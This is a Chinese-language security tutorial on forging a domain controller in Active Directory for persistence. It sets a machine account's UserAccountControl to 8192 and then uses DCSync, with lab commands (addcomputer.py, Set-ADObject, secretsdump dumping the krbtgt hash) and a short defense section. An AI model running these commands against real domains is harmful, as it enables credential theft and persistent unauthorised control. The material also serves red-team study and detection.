2022年1月10日，国外安全研究员Kaido发文称发现了一种新的伪造域控方式，安全研究员只需要新建一个机器账户，然后修改机器账户的UserAccountControl属性为8192。活动目录就会认为这个机器账户就是域控，然后就可以使用这个新建的机器账户进行DCSync操作了。由于修改机器账户的UserAccountControl属性需要域内高权限，因此这种方式可以用来进行域权限维持。

这种权限维持方式与DCShadow类似，都是在域内伪造域控。只不过DCShadow是通过往域内添加恶意对象，而此种方式是通过DSCync功能导出域内任意用户的Hash。

## 漏洞原理

为什么把机器账户的UserAccountControl属性修改为8192，活动目录就会认为这个机器账户是域控呢？首先，我们来看一下UserAccountControl属性。通过官方文档可以清楚的看到UserAccountControl属性可能得值，如图所示：

![图片.png](https://image.3001.net/images/20230606/1685982894_647e0eae508ec206e6290.png!small)

当该值为8192时，对应的SERVER_TRUST_ACCOUNT属性标志对应的含义，如图所示，可以看到微软对该属性标志位的解释是作为域中的一个成员域控的计算机账户。

因此，把机器账户的UserAccountControl属性修改为8192后，活动目录就会认为这个机器账户是域控

![图片.png](https://image.3001.net/images/20230606/1685982910_647e0ebe887a8b41f59f0.png!small)

## 伪造域控攻击

实验环境如下：

  * 域控：Windows Server 2012 R2

  * 域控主机名：DC

  * 域控IP：192.168.41.10

  * 域管理员：hack\administrator

  * 域普通用户：hack\jack

首先使用addcomputer.py脚本执行如下的命令创建一个普通的机器账户machine$，密码为root，如图所示：

    
    
    python3 addcomputer.py -computer-name 'machine' -computer-pass 'root' -dc-ip 192.168.41.10 'hack.com/jack:Admin123' -method SAMR -debug
    

![图片.png](https://image.3001.net/images/20230606/1685982928_647e0ed0c86eda150e2be.png!small)

然后修改该机器账户的UserAccountControl属性。默认情况下，只有域管理员和企业管理员等高权限用户有权限修改机器账户的UserAccountControl属性。

使用域管理员权限通过Powershell执行如下的命令修改机器账户的machine$的UserAccountControl属性为8192，如图所示：

    
    
    $ADComputer = Get-ADComputer -Identity machine
    Set-ADObject -Identity $ADComputer -Replace @{userAccountControl=8192}
    

![图片.png](https://image.3001.net/images/20230606/1685982946_647e0ee2c05771d7e1591.png!small)

此时，活动目录就会认为机器账户machine$是域控，如图所示，通过查询Domain Controllers组可以看到machine$机器账户就在其中

    
    
    net group "domain controllers" /domain
    

![图片.png](https://image.3001.net/images/20230606/1685982990_647e0f0e6544512565e8a.png!small)

现在就可以利用机器账户machine$通过DCSync导出域内任意用户的Hash了。

如图所示，可以看到修改userAccountControl属性后，机器账户machine$  
可以通过DCSync导出域内任意用户的Hash了。

    
    
    secretsdump.exe "hack/machine$:root"@192.168.41.10 -just-dc-user krbtgt
    

![图片.png](https://image.3001.net/images/20230606/1685983013_647e0f252d487ab18d846.png!small)

## 伪造域控攻击防御

对于防守方或蓝队来说，如何针对伪造域控攻击进行防御呢？

  * 及时修复域内漏洞，更新最新补丁，让攻击者无法获得域管理员权限或Exchange  
邮箱服务器权限，自然也就无法修改机器账户的userAccountControl属性。

  * 定期检查userAccountControl属性为8192的机器账户。

